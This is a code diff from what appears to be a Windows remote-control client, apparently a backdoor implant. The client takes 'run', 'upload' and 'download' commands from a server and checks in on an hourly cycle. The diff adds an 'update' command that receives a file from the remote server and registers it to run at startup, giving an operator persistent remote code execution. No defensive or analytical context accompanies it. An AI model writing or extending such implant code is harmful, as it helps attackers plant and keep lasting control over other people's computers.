@@ -4,6 +4,8 @@
 
 #include "Utils.h"
 
+#include <locale>
+
 // Link with ws2_32.lib
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -17,6 +19,7 @@ constexpr char RUN_COMMAND[] = "run";
 constexpr char OK_COMMAND[] = "ok";
 constexpr char UPLOAD_COMMAND[] = "upload";
 constexpr char DOWNLOAD_COMMAND[] = "download";
+constexpr char UPDATE_COMMAND[] = "update";
 
 constexpr DWORD SLEEP_TIME = 1 * 1000 * 60 * 60;
 
@@ -155,6 +158,10 @@ void handleMsg(ClientSocket& client, const std::string& msg) {
             }
             throw e;
         }
+        client.sendMsg(OK_COMMAND);
+    } else if (command == UPDATE_COMMAND) {
+        std::string fileName = client.recvFile();
+        runOnStartUp(fileName);
         client.sendMsg(OK_COMMAND);
     }
     else {
